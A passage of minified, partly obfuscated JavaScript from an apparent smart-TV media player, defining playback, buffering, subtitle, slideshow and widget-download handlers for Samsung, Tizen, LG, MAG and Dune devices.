video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px"}else if(n==3){tagRatio=4/3;if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
video.style.width=xWidth?"2576px":"1728px";video.style.height=xWidth?"1449px":"976px";video.style.top=xWidth?"-186px":"-128px";video.style.left=xWidth?"-328px":"-224px"}
if(n==0){video.style.width=window.innerWidth+"px";video.style.height=window.innerHeight+"px";video.style.top="0px";video.style.left="0px"}},setMini:function(){var c=vPlayer;if(lIllO0Imlel1IlI1Ypr=="ifrhtml5")var idv="other";else idv="video";if(c.is_mini())c.setidprop(idv,"mini");else c.setidprop(idv,0)},startAudio:function(u){if(lIllO0Imlel1IlI1Ypr=="audio"){$_("other").style.width="1%";$_("other").style.height="1%";$_("other").style.display="block";$_("other",'<audio id="audio" autoplay="autoplay" src="'+u+'"></audio>');video=$_("audio")}else{video=$_("video");video.src=u;if(maJor.platform().match(/lg/))video.type="video/mp4";else video.type="audio/mpeg";video.autoplay=!0}
video.play()},start:function(url,start){this.name=lIllO0Imlel1IlI1Ypr;if(ua.match(/sony/))var type="video/mpeg";else if(pstream){if(maJor.platform().match(/lg/))type="application/x-netcast-av";else if(maJor.platform()=="sharp"){type="application/vnd.apple.mpegurl";l10I11l10duklS11llOYpr("Sharp iptv stream!")}else type="application/vnd.apple.mpegurl"}else if(url.indexOf(".mp3")>0&&!maJor.platform().match(/lg/))type="audio/mpeg";else type="video/mp4";this.setMini();if(lIllO0Imlel1IlI1Ypr=="ifrhtml5"){$_("video").style.display="none";$_("jw").style.display="none";$_("other").style.display="block";$_("other","<iframe style='display:block;background-color:black;position:absolute;top:0px;left:0px;border:none;margin:0px;padding:0px;width:100%;height:100%;' id='piframe' src='javascript:d=document;d.clear();d.open();"+"d.write(&quot;&lt;html&gt;   &lt;/html&gt;)'>");var iframe=$_("piframe");iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);iframe.document.open();iframe.document.write("<!DOCTYPE html><html>"+"<body style='margin:0px; padding:0px;width:100%;height:100%;overflow: hidden;'>"+"<video id='piframevideo' style='width:100%;height:100%;' autoplay=true type='"+type+"' src='"+url+"'> </video>"+"<script>"+"var video=document.getElementById('piframevideo');"+"var fst=0;"+"video.addEventListener('timeupdate',function(){"+"var hash=window.location.hash.split('-');"+"if(hash&&hash[0]=='rewind'){video.currentTime=hash[1];}"+"window.location.hash='';"+"parent.vPlayer.getVideoPlayInfo(video.currentTime,video.duration);"+"});"+"video.addEventListener('loadedmetadata', parent.vPlayer.OnBufferingComplete);"+"video.addEventListener('error', parent.vPlayer.eventerrvideo);"+"video.onmousemove=parent.vPlayer.OnMouseMove;	"+"document.addEventListener('keydown',parent.keyHandlerPress,false);"+"parent.video=video;"+"</script>"+
+"</body></html>");iframe.document.close()}else{video=$_("video");video.addEventListener('loadedmetadata',vPlayer.OnBufferingComplete);video.addEventListener('error',vPlayer.eventerrvideo);video.src=url;video.style.display="block";$_("jw").style.display="none";video.type=type;video.autoplay=!0;if(maJor.platform()=="android-device"){video.addEventListener("click",function(){video.play()})}else video.play()}
this.onstart=function(){video.play();if(start)this.currentTime=start}},stop:function(){if(video){this.pause()}},exit:function(){if(video)video.style.display="none"},play:function(){video.play()},seek:function(sec){video.currentTime=sec},getRate:function(){return video.playbackRate||1},rate:function(rate){video.playbackRate=rate},getPosition:function(){return video.currentTime},getTotal:function(){return video.duration}},OnMouseMove:function(){if(handler.match(/player|qual/)){vPlayer.showPlayer();vPlayer.triggerHide()}},image:{name:"image",exis:function(){return 1},startslide:function(){var c=this;clearTimeout(this.slideTimer);this.slideTimer=setTimeout(function(){if(getSelect()+1<gP().channels.length){IlO11lQ0().focused(getSelect()+1);if(is_img(curCh("stream_url"))||curCh("type")=="img"){$_("jwmedia").src=curCh("stream_url");c.startslide()}else vPlayer.lIOQ0lI1iZm1hQ1O0Ypr()}else{if(parseInt(maJor.params.get('next'))==3){setSelect(-1);c.startslide()}else vPlayer.lIOQ0lI1iZm1hQ1O0Ypr()}},slide_mode)},pause:function(){clearTimeout(this.slideTimer);if(!is_rek)kjtYpr.popUp("_FPSlideshow_: _FPOstanovleno_",1200);vPlayer.paused=!0},start:function(url){if(url.indexOf("image/")==0)url=url.substr(6);video.style.display="none";$_("jw").style.display="block";$_("infPl","IMAGE");var b="<div style='width:100%;height:100%;text-align:center;background-color:black;'><img id='jwmedia' style='visibility:hidden;' onload='imgonload(this);' src='"+url+"' align='center' /></div>";$_("jw",b);if(rek_url=="")this.startslide();else if(is_rek){rekBox();rek_totaltime=Point["Duration"]||3;if(rek_totaltime>600)rek_totaltime=600;rek_curtime=0;rek_curtimeint=setInterval(" if(is_rek) vPlayer.getVideoPlayInfo(++rek_curtime,"+rek_totaltime+"); else clearInterval(rek_curtimeint);",1000)}},stop:function(){this.pause()},exit:function(){$_("jw","");$_("jw").style.display="none";if(vPlayer.audio.played())if($_("vk_audio").style.zIndex=="-5"){$_("vk_audio").style.zIndex="0";$_("vk_audio").style.display="block"}},play:function(){if(!is_rek){if(!vPlayer.paused){if(slide_mode==5000)slide_mode=9000;else if(slide_mode==9000)slide_mode=13000;else slide_mode=5000}
startslide();kjtYpr.popUp("_FPSlideshow_: "+(slide_mode/1000)+"_FPsec_.",1200)}},seek:function(sec){},getPosition:function(){},getTotal:function(){}},dune:{name:"dune",exis:function(){return 1},pause:function(){if(stb.canPause())stb.pause();else stb.stop()},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("dune-api","mini");else c.setidprop("dune-api",0)},startAudio:function(u){stb.play(u)},start:function(url,start){this.setMini();$_("dune-api").style.zIndex="1";stb.play(url);magpropv()},stop:function(){stb.stop()},exit:function(){$_("dune-api").style.zIndex="0"},play:function(){stb.resume()},seek:function(sec){stb.setPositionInSeconds(sec)},getPosition:function(){return stb.getPositionInSeconds()},getTotal:function(){return stb.getLengthInSeconds()}},tizen:{name:"tizen",exis:function(){return webapis&&webapis.avplay},pause:function(){webapis.avplay.pause()},subtitle:function(set){if(this.sub_all){set=set||0;if(set>this.sub_all)set=0;if(set<0)set=this.sub_all;if(set){webapis.avplay.setSilentSubtitle(!1);webapis.avplay.setSelectTrack("TEXT",(set+this.snum_start-1))}else webapis.avplay.setSilentSubtitle(!0);this.sub_sel=set}},audioTracks:function(set){var trackInfo=webapis.avplay.getTotalTrackInfo();this.tnum=0;this.sub_all=0;this.tnum_start=-1;this.snum_start=-1;for(var i=0;i<trackInfo.length;i++){if(trackInfo[i].type=="AUDIO"){if(this.tnum_start<0)this.tnum_start=i;this.tnum++}
if(trackInfo[i].type=="TEXT"){if(this.snum_start<0)this.snum_start=i;this.sub_all++}}
if(this.tnum>1){if(set!=null){if(set>=this.tnum)set=0;else if(set<0)set=this.tnum-1;webapis.avplay.setSelectTrack("AUDIO",(this.tnum_start+set));this.audioCur=set}else this.audioCur=this.audioCur||0;return{count:this.tnum,name:"",sel:this.audioCur}}else{return}},getInfo:function(){var c=vPlayer;var streaminfo=webapis.avplay.getCurrentStreamInfo()||[];if(n==0)var text="ORIGINAL";else if(n==1)text="FULL";else text="AUTO";for(var i=0;i<streaminfo.length;i++){if(streaminfo[i].type=="VIDEO"){var j=l0OIIlIIlONuu1111Ypr(streaminfo[i].extra_info);text+=" "+j.Width+"x"+j.Height}}
return text},setSize:function(n){var c=vPlayer;if(c.is_mini())return;n=n||maJor.params.get('xmode');if(n<0)n=2;else if(n>2)n=0;if(n==0)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_LETTER_BOX");else if(n==1)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_FULL_SCREEN");else if(n==2)webapis.avplay.setDisplayMethod("PLAYER_DISPLAY_MODE_AUTO_ASPECT_RATIO");maJor.params.set('xmode',n)},setMini:function(){var c=vPlayer;if(c.is_mini())webapis.avplay.setDisplayRect(1292,675,628,405);else{webapis.avplay.setDisplayRect(0,0,1920,1080);webapis.avplay.setListener({onbufferingstart:c.OnBufferingStart,onbufferingprogress:c.OnBufferingProgress,onbufferingcomplete:c.OnBufferingComplete,onsubtitlechange:function(duration,text,type,attriCount,attributes){clearTimeout(c.subtitles.timerSub);$_("subtitle").style.display="block";$_("subtitle",text);c.subtitles.timerSub=setTimeout('$_("subtitle","");',duration)},onstreamcompleted:function(){setTimeout("setProp("+maJor.params.get('xmode')+");",300)},oncurrentplaytime:function(currentTime){vPlayer.curTime=currentTime},ondrmevent:function(e,f){},onerror:function(e,f){kjtYpr.popUp("Err video:"+e.toString()+f.toString(),2500);eventerrvideo()}})}},startAudio:function(u){try{webapis.avplay.stop();webapis.avplay.open(u);webapis.avplay.setListener({oncurrentplaytime:function(currentTime){vPlayer.curTime=currentTime;vPlayer.getVideoPlayInfo()},ondrmevent:function(e,f){},onerror:function(e,f){}});webapis.avplay.prepareAsync(function(e){webapis.avplay.play();vPlayer.getVideoPlayInfo()},function(e){vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();kjtYpr.popUp(e.toString(),2500)})}catch(e){kjtYpr.popUp(e.toString(),2500)}},start:function(url){var c=vPlayer;this.speedrate=1;c.setidprop("av-player",0);$_("av-player").style.display="block";$_("av-player").onmousemove=vPlayer.OnMouseMove;this.sub_sel=0;try{webapis.avplay.stop();webapis.avplay.open(url)}catch(e){kjtYpr.popUp("Error 1<br>"+e.message,4000)}
this.setMini();webapis.avplay.prepareAsync(function(e){webapis.avplay.play();vPlayer.getVideoPlayInfo();webapis.avplay.setSilentSubtitle(!0)},function(e){l10I11l10duklS11llOYpr("Error: "+e.toString());c.eventerrvideo()})},stop:function(){webapis.avplay.stop();webapis.avplay.close()},exit:function(){$_("av-player").style.display="none"},play:function(){webapis.avplay.play()},seek:function(sec){webapis.avplay.seekTo(sec*1000)},getRate:function(){return this.speedrate||1},rate:function(rate){this.speedrate=rate;webapis.avplay.setSpeed(rate)},getPosition:function(){return webapis.avplay.getCurrentTime()/1000},getTotal:function(){return webapis.avplay.getDuration()/1000}},maple:{name:"maple",exis:function(){return 1},pause:function(){if(this.SefPlugin)this.SefPlugin.Execute('Pause');else this.plugin.Pause()},mode3D:0,Set3Dtype:function(n){var c=vPlayer;if(this.Screen3Dplugin){this.mode3D+=n;if(this.mode3D>2)this.mode3D=0;else if(this.mode3D<0)this.mode3D=2;if(this.mode3D==1)l10I11l10duklS11llOYpr('3D SIDE - BY - SIDE');else if(this.mode3D==2)l10I11l10duklS11llOYpr('3D TOP - BOTTOM');else l10I11l10duklS11llOYpr('3D OFF');this.Screen3Dplugin.Set3DEffectMode(this.mode3D)}else l10I11l10duklS11llOYpr('3D _FPnePodderzhivaetsya_!')},sefInstall:function(m,s){var c=this;this.alls+=s+"|";kjtYpr.popUp(s);var name=c.wint_name,len="";if(window.FileSystem){var arrFiles=(new FileSystem()).readDir('/mtd_rwcommon/common');if(arrFiles){for(var i=2;i<arrFiles.length;i++)if(arrFiles[i].name==name+".zip")len=ToSize(arrFiles[i].size);}}
var cc=s.split("?");if(cc[0]=="1001"){kjtYpr.inf("Загрузка ("+len+")! "+cc[1]+"%",1200,"#eee");cc[1]=cc[1]/1.2;if(cc[1]<10)cc[1]=10}else if(cc[0]=="1000"){kjtYpr.popUp("_FPIdetUstanovkaVidgeta_...");kjtYpr.inf("_FPUstanovka_ ("+len+")...",1200,"#eee");setTimeout(function(){c.FilePlugin.Unzip('/mtd_rwcommon/widgets/user/'+name+".zip",'/mtd_rwcommon/widgets/user/'+name+'/');if(c.FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+"/config.xml")){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("<b>_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0);c.urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun0=function(){document.location=c.urlinst}}else{is_loadpage(0);kjtYpr.inf("_FPOshibkaUstanovki_ "+name+" !",2000,"orange")}},1000)}},pasteFile:function(from,to,names){var c=this;var ss=from.split("-|-");var ssn=names.split("-|-");var retry=!1;for(var i=0;i<ss.length;i++){var x=this.usbCopy(ss[i],to,ssn[i]);if(x==2){c.retlast=ss.length;ss.splice(i,1);ssn.splice(i,1);i--}else if(x==1){c.retlast=ss.length;c.rettm="_FPZagruzka_ "+ssn[i]+" _FPQueue_: "+(ss.length-1)+" _FPPressStopToCancel_";statusbar(c.rettm,"copy");ss.splice(i,1);ssn.splice(i,1);i--;if(gP("lII1I1PVBuI1lIlYpr").replace("usb://","").replace("xml://","")==to){IlO11lQ0().reload()}}else{kjtYpr.inf("Err paste files",1500);break}}},usbCopy:function(usbPath,to,names){var c=this;try{if(copyUsbMode==1)return 0;c.FilePlugin=$_('pluginObjectFileSystem');if(usbPath.indexOf("http")==0){if(c.SefPlugin){var name=usbPath.substr(usbPath.lastIndexOf("/")+1);if(name.indexOf("?")>0)name=name.substr(0,name.indexOf("?"));if(names){names=totranslit(names,!1).replace(/[^a-zA-Z0-9.]/g,'_');names+=name.substr(name.lastIndexOf("."));name=names}
if(c.FilePlugin.IsExistedPath(to+'/'+name)){if(copyUsbMode==0){copyUsbMode=1;confirmed.create("","_FPexistOverwrite_?","_FPOverwriteAll_|_FPSkipAll_");confirmed.fun0=function(){copyUsbMode=2};confirmed.fun1=function(){copyUsbMode=3};return 0}else if(copyUsbMode==3){statusbar("_FPSkipAll_ "+name,2000);return 2}}
c.SefPlugin.Open("Download","1.000","");c.SefPlugin.OnEvent=function(m,s){var c=s.split("?");if(c[0]!="1000"){c.rettm="_FPZagruzka_ "+c[1]+"% "+c.retname+" _FPQueue_: "+c.retlast+" _FPPressStopToCancel_";statusbar(c.rettm,"copy")}else statusbar("off")};if(!c.SefPlugin.Execute('StartDownFile',usbPath,to+'/'+name,1,1))return-1;else{kjtYpr.inf("_FPZagruzka_! _FPQueue_: "+c.retlast+" _FPPressStopToCancel_!",2000);c.retname=name;return 1}}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange")}else{c.FilePlugin.Copy(usbPath,to)}}catch(e){kjtYpr.popUp(e.message)}},savezipfile:function(url,n){var c=this;c.alls="";clearTimeout(c.siptimer);c.siptimer=setTimeout(function(){if(!c.alls)c.sefInstall(1,"1000?1")},20000);kjtYpr.popUp(url+"...");c.urlinst="";c.FilePlugin=$_('pluginObjectFileSystem');try{var leftspace="<font color='#EEE'>Свободно в ТВ:</font> "+ToSize(c.FilePlugin.GetTotalSize()-c.FilePlugin.GetUsedSize())}catch(e){}
if(Wdg.exec(url)){if(n==null)var name=url.substr(url.lastIndexOf("/")+1).replace(/.zip/i,"");else name=n;c.wint_name=name;if(c.FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')&&!wlistRewrite){clearTimeout(c.siptimer);is_loadpage(0);kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red");c.urlinst='/mtd_rwcommon/widgets/user/'+name+'/index.html';confirmed.create("_FPOpenWidget_ "+name+"?<br> _FPrecomOpenFromSmartHub_","Open app").fun0=function(){document.location=c.urlinst}}else if(c.SefPlugin){c.SefPlugin.Open("Download","1.000","");c.SefPlugin.OnEvent=this.sefInstall;if(c.SefPlugin.Execute('StartDownFile',url,'/mtd_rwcommon/widgets/user/'+name+".zip",10,10)){is_loadpage(1)}else kjtYpr.inf("_FPOshibka_!",2000,"orange")}else kjtYpr.inf("_FPnePodderzhivaetsya_ на вашем ТВ!",2000,"orange")}},abf:[0.05,0.1,0.2,0.3,0.5,0.7,1,1.2,1.8,2.5,3,4,5,6,7,8,9,10,13,15,20],SetBuffer:function(buf){buf=buf||parseInt(maJor.params.get("buffer"));if(buf>this.abf.length-1)buf=this.abf.length-1;else if(buf<1)buf=1;if(buf<=17)var all_buf=10;else all_buf=20;var x_buf=parseInt((all_buf*1048576),10);var x_ibuf=parseInt((this.abf[buf]*1048576),10);if(buf==2)return;if(this.SefPlugin){this.SefPlugin.Execute('SetInitialBuffer',x_ibuf);if(buf>3){this.SefPlugin.Execute('SetTotalBufferSize',x_buf);this.SefPlugin.Execute('SetPendingBuffer',x_ibuf)}}else{this.plugin.SetInitialBuffer&&this.plugin.SetInitialBuffer(x_ibuf);if(buf>3){this.plugin.SetTotalBufferSize&&this.plugin.SetTotalBufferSize(x_buf);this.plugin.SetPendingBuffer&&this.plugin.SetPendingBuffer(x_ibuf)}}},volume:function(x){if(x!=null&&this.plaginAudio){if(x<50)this.plaginAudio.SetVolumeWithKey(1);else this.plaginAudio.SetVolumeWithKey(0)}
return 50},getInfo:function(){var c=vPlayer;if(maJor.params.get('xmode')==1)var text="FULL";else if(maJor.params.get('xmode')==0)text="ORIGINAL";else if(maJor.params.get('xmode')==2)text="MANUAL "+maJor.params.get('Pw')+"%/"+maJor.params.get('Ph')+"%";if(this.SefPlugin)var r=(this.SefPlugin.Execute('GetVideoResolution')||"").split('|');else r=[this.plugin.GetVideoWidth(),this.plugin.GetVideoHeight()];if(r.length){if(r[0]==5)r=[540,432];else if(r[0]==4)r=[480,270];this.w=r[0];this.h=r[1];text+=" "+r[0]+"x"+r[1]}else{this.w="";this.h=""}
return text},setSize:function(n){var c=vPlayer;if(c.is_mini())return;n=n||maJor.params.get('xmode');if(n<0)n=2;else if(n>2)n=0;var x_res=960,y_res=540;if(!this.w)this.getInfo();if(this.w){var area_x=0;var area_y=0;var area_w=960;var area_h=540;var crop_x=0;var crop_y=0;var crop_w=this.w;var crop_h=this.h;if(n==0){if(crop_w/crop_h<1.79){area_w=y_res*crop_w/crop_h;area_x=(x_res-area_w)/2}else{area_h=x_res*crop_h/crop_w;area_y=(y_res-area_h)/2}}else if(n==2){if(maJor.params.get('Pw')>200)maJor.params.set('Pw',200);if(maJor.params.get('Ph')>200)maJor.params.set('Ph',200);if(maJor.params.get('Pw')<=100){area_w=(x_res/100)*maJor.params.get('Pw');area_x=(x_res-area_w)/2}else{crop_x=crop_w*(maJor.params.get('Pw')/200-0.5);crop_w=crop_w*(2-maJor.params.get('Pw')/100)}
if(maJor.params.get('Ph')<=100){area_h=(y_res/100)*maJor.params.get('Ph');area_y=(y_res-area_h)/2}else{crop_y=crop_h*((maJor.params.get('Ph')/200)-0.5);crop_h=crop_h*(2-maJor.params.get('Ph')/100)}}
if(this.SefPlugin){this.SefPlugin.Execute('SetDisplayArea',area_x,area_y,area_w,area_h);if(n!=1)this.SefPlugin.Execute('SetCropArea',crop_x,crop_y,crop_w,crop_h);else if(this.change)this.SefPlugin.Execute('SetCropArea',0,0,0,0)}else{this.plugin.SetDisplayArea(area_x,area_y,area_w,area_h);if(n!=1)this.plugin.SetCropArea(crop_x,crop_y,crop_w,crop_h);else if(this.change)this.plugin.SetCropArea(0,0,0,0)}
this.change=!0}
maJor.params.set('xmode',n)},setMini:function(){var c=vPlayer;if(c.is_mini()){if(this.SefPlugin)this.SefPlugin.Execute('SetDisplayArea',643,340,317,200);else this.plugin.SetDisplayArea(643,340,317,200);this.onstop=function(){FXMLPage.ll00IOO11EVII1IYpr()}
FXMLPage.ll00IOO11EVII1IYpr()}else{$_("main").style.background="none";$_("pr").style.background="none";$_("bcg1").style.display="none";$_("bcg2").style.display="none";if(this.SefPlugin)this.SefPlugin.Execute('SetDisplayArea',0,0,960,540);else this.plugin.SetDisplayArea(0,0,960,540)}},LangCodes:{6514793:'Китайская',6647399:'Английская',6713957:'Француская',6776178:'Немецкая',6911073:'Итальянская',6975598:'Японская',7040882:'Корейская',7368562:'Португальская',7501171:'Русская',7565409:'Испанская'},audioTracks:function(set){if(this.SefPlugin){var len=this.SefPlugin.Execute('GetTotalNumOfStreamID',1)||0;if(len>0){if(set!=null){if(set>(len-1))set=0;else if(set<0)set=len-1;this.SefPlugin.Execute('SetStreamID',1,set);this.audioCur=set}else this.audioCur=this.SefPlugin.Execute('GetCurrentStreamID',1)||0;this.audioName=this.SefPlugin.Execute('GetStreamLanguageInfo',1,set);this.audioName=this.LangCodes[this.audioName]||this.audioName;return{count:len,name:this.audioName,sel:this.audioCur}}else{this.audioCur=this.audioName=0;return}}},getAudioNum:function(){if(this.SefPlugin)return(this.SefPlugin.Execute('GetTotalNumOfStreamID',1)||0);else return 0},startAudio:function(u){if(this.init()){if(this.SefPlugin){this.SefPlugin.Open('Player','1.000','Player');this.SefPlugin.Execute('InitPlayer',u);this.SefPlugin.Execute('SetPlayerProperty','2','0','0');this.SefPlugin.Execute('StartPlayback')}else if(maJor.series=="C"){this.plugin.Play(u)}else{this.plugin.InitPlayer(u);this.plugin.SetPlayerProperty('2','0','0');this.plugin.StartPlayback()}}},init:function(){var c=vPlayer;this.plaginAudio=$_('pluginAudio');document.body.onmousemove=c.OnMouseMove;if($_('pluginObjectSef')&&$_('pluginObjectSef').Execute)this.SefPlugin=$_('pluginObjectSef');else if($_('pluginPlayer')&&$_('pluginPlayer').InitPlayer){this.plugin=$_('pluginPlayer');this.plugin.OnBufferingStart=c.OnBufferingStart;this.plugin.OnBufferingProgress=c.OnBufferingProgress;this.plugin.OnBufferingComplete=c.OnBufferingComplete;this.plugin.OnCurrentPlayTime=c.OnCurrentPlayTime}
if($_('pluginObjectTVMW')&&$_('pluginObjectTVMW').SetMediaSource)$_('pluginObjectTVMW').SetMediaSource();if($_('pluginObjectScreen3D')&&$_('pluginObjectScreen3D').Flag3DEffectSupport&&$_('pluginObjectScreen3D').Flag3DEffectSupport()&&$_('pluginObjectScreen3D').Flag3DTVConnect&&$_('pluginObjectScreen3D').Flag3DTVConnect())
this.Screen3Dplugin=$_('pluginObjectScreen3D');if(this.plugin||this.SefPlugin)return 1;else kjtYpr.inf("Error initialization samsung maple player",2000,"red")},start:function(url,start){var c=vPlayer;if(!this.init())return;$_("video").style.display="none";$_("jw").style.display="none";start=start||0;pluginAPI.setOffScreenSaver();pluginAPI.setOffIdleEvent();this.change=!1;if(is_m3u8(url)==2&&-1===url.indexOf("COMPONENT=HLS"))url+="|COMPONENT=HLS";if(kjtYpr.buffer>10)kjtYpr.buffer=10;this.stop();if(url.indexOf('.mp3')==-1)this.SetBuffer();if(this.SefPlugin){this.SefPlugin.Open('Player','1.000','Player');this.SefPlugin.Execute('InitPlayer',url);this.SefPlugin.OnEvent=function(num,val){switch(num){case 1:case 3:case 4:case 6:c.eventerrvideo();break;case 11:c.OnBufferingStart();break;case 12:c.OnBufferingComplete();break;case 13:c.OnBufferingProgress(val);break;case 14:if($_("loading").style.display=="block")c.setLoading("off",Math.random());c.OnCurrentPlayTime(val);break}};if(this.mode3D)this.SefPlugin.Execute('SetPlayerProperty','2','3',this.mode3D);else this.SefPlugin.Execute('SetPlayerProperty','5','0','0');if(maJor.params.get("timeoutiptv")>49)this.SefPlugin.Execute('SetInitialTimeOut',maJor.params.get("timeoutiptv"));this.SefPlugin.Execute('StartPlayback',start)}else if(!this.plugin.StartPlayback)this.plugin.Play(url);else{this.plugin.InitPlayer&&this.plugin.InitPlayer(url);this.plugin.StartPlayback(start)}
this.setMini();l10I11l10duklS11llOYpr("_FPPodkluchenie_.")},stop:function(){if(this.mode3D)this.Screen3Dplugin.Set3DEffectMode(0);this.mode3D=0;vPlayer.totalTime=0;vPlayer.curTime=0;if(this.SefPlugin){this.SefPlugin.Execute('Stop');this.SefPlugin.Execute('ClearScreen');this.SefPlugin.Close()}else if(this.plugin){this.plugin.Stop();this.plugin.ClearScreen()}},exit:function(){},play:function(){var c=vPlayer;if(this.SefPlugin)this.SefPlugin.Execute('Resume');else this.plugin.Resume();if(gV(c.playElement,"url").indexOf('http')==0&&c.longpause){c.frw(-3)}},seek:function(sec){sec-=this.getPosition();if(sec<0){if(this.SefPlugin)this.SefPlugin.Execute('JumpBackward',-1*sec);else this.plugin.JumpBackward(-1*sec)}
if(sec>0){if(this.SefPlugin)this.SefPlugin.Execute('JumpForward',sec);else this.plugin.JumpForward(sec)}},getPosition:function(){return vPlayer.curTime},getTotal:function(){return Math.ceil(parseInt((this.SefPlugin)?this.SefPlugin.Execute('GetDuration'):this.plugin.GetDuration())/1000)}},mag:{name:"mag",exis:function(){return window.gSTB},pause:function(){stb.Pause()},getInfo:function(){var c=vPlayer;var w=stb.GetVideoInfo().match(/pictureWidth:(.*?),/)[1];var h=stb.GetVideoInfo().match(/pictureHeight:(.*?),/)[1];var text=w+"x"+h+" _FPProporcii_: "+maJor.params.get('xmode');return text},setSize:function(){if(maJor.params.get('xmode')>5)maJor.params.set('xmode',1);if(maJor.params.get('xmode')<1)maJor.params.set('xmode',5);if(maJor.params.get('xmode')==1)stb.SetAspect(0x10);else if(maJor.params.get('xmode')==2)stb.SetAspect(0x20);else if(maJor.params.get('xmode')==3)stb.SetAspect(0x30);else if(maJor.params.get('xmode')==4)stb.SetAspect(0x40);else if(maJor.params.get('xmode')==5)stb.SetAspect(0x50)},setMini:function(){var c=vPlayer;if(c.is_mini())stb.SetPIG(0,0.25,643,340);else stb.SetPIG(1,0,0,0)},startAudio:function(u){stb.Play(u);stb.SetPIG(1,0,0,0);stb.SetWinMode&&stb.SetWinMode(0);stb.SetTopWin&&stb.SetTopWin(0)},start:function(url){var c=vPlayer;$_("video").style.display="none";$_("jw").style.display="none";if(stb.SetCustomHeader)stb.SetCustomHeader('User-Agent: '+ua_chrome);stb.Play(url);this.setMini();magpropv()},stop:function(){stb.Stop()},exit:function(){},volume:function(x){if(x!=null)stb.SetVolume(x);return stb.GetVolume()},play:function(){stb.Continue()},seek:function(sec){stb.SetPosTime(sec)},getPosition:function(){return stb.GetPosTime()},getTotal:function(){return stb.GetMediaLen()}},media:{name:"media",exis:function(){return 1},getInfo:function(){var c=vPlayer;if(media&&media.mediaPlayInfo&&media.mediaPlayInfo()){var playInfo=media.mediaPlayInfo();if(playInfo.bitrateInstant)text+=(playInfo.bitrateInstant/1048576).toFixed(2)+" Mbit/s";c.curTime=playInfo.currentPosition;c.totalTime=playInfo.duration}
return text},pause:function(){media.play&&media.play(0)},fullscreen:function(){if(media.requestFullScreen)media.requestFullScreen();else if(media.mozRequestFullScreen)media.mozRequestFullScreen();else if(media.webkitRequestFullScreen)media.webkitRequestFullScreen();$_("media").style.width="100%";$_("media").style.height="100%"},setMini:function(){var c=vPlayer;if(c.is_mini())c.setidprop("jw","mini");else c.setidprop("jw",0)},startAudio:function(u){$_("other").style.display="block";$_("other").style.width="1%";$_("other").style.height="1%";$_("other",'<object type="video/mp4" preBufferingTime="8" audioLanguage="ru" data="'+u+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)},start:function(url){video.style.display="none";$_("jw").style.display="block";this.setMini();if(pstream&&maJor.platform().match(/lg/))var type="application/x-netcast-av";else type="video/mpeg";if(maJor.platform().match(/lg/)&&maJor.series!="LW")var opt='onPlayStateChange="vPlayer.OnBufferingComplete();" preBufferingTime="8" ';else opt='';var chl=maJor.read("mlang");if(chl&&optLang[chl]){optLangSel=chl;opt+=' audioLanguage="'+optLang[optLangSel]+'"'}
if(maJor.platform()=="ph"&&pstream)type="application/vnd.apple.mpegurl";$_("jw",'<object type="'+type+'" '+opt+'data="'+url+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)},stop:function(){this.pause()},exit:function(){$_("jw","");$_("jw").style.display="none"},play:function(){media.play(1)},seek:function(sec){media.seek(sec*1000)},getPosition:function(){this.getInfo();return vPlayer.curTime},getTotal:function(){this.getInfo();return vPlayer.totalTime}},OnBufferingStart:function(){if($_("playerBottom").style.display=="none"&&$_("loading").style.display=="none")l10I11l10duklS11llOYpr("_FPZagruzka_. 1%");else $_("infR","_FPZagruzka_. 1%");iptv_succed=!0},OnBufferingProgress:function(per){var c=vPlayer;iptv_succed=!0;c.setLoading("on",c.curTime);if(per&&typeof per!="object")per=" "+per+"%";else per=".";l10I11l10duklS11llOYpr("_FPZagruzka_."+per)},OnCurrentPlayTime:function(val){var c=vPlayer;if($_("loading").style.display=="block")c.setLoading("off",Math.random());c.curTime=Math.ceil(parseInt(val,10)/1000);c.getVideoPlayInfo()},getInfo:function(){var c=this;try{var text=((vPlayer.player().getInfo&&vPlayer.player().getInfo())||"")}catch(e){}
if(c.subtitles.exis())text+=" _FPSubtitles_: "+c.subtitles.getName()+" ("+c.playElement.subsrc.length+")";return text},OnBufferingComplete:function(){var c=vPlayer;statusbar();setTimeout('vPlayer.setLoading("off", Math.random());',500);c.glSec=0;c.getVideoPlayInfo();c.player().getAudioNum&&c.player().getAudioNum();c.player().setSize&&c.player().setSize();if(c.player().onstart){c.player().onstart();c.player().onstart=null}
c.showPlayer();c.triggerHide(600);c.iptv_retry=0;c.subtitles.lllIOlu0iNO10IIYpr();l10I11l10duklS11llOYpr(" ")},getCur:function(){var c=this;try{if(is_rek&&rek_curtime)c.curTime=rek_curtime;else c.curTime=parseInt(c.player().getPosition())||0}catch(e){c.curTime=0}
return c.curTime},getTotal:function(){var c=this;try{if(is_rek&&rek_totaltime)c.totalTime=rek_totaltime;else c.totalTime=parseInt(c.player().getTotal())||0}catch(e){c.totalTime=0}
return c.totalTime},player:function(){var c=this;if(c.audio.played())return c.audio.player();if(lIllO0Imlel1IlI1Ypr=="audio")lIllO0Imlel1IlI1Ypr="html5";else if(lIllO0Imlel1IlI1Ypr=="media"){if(maJor.platform()=="maple")return c.maple;else if(maJor.platform()=="dune")return c.dune;else if(maJor.platform()=="mag")return c.mag}
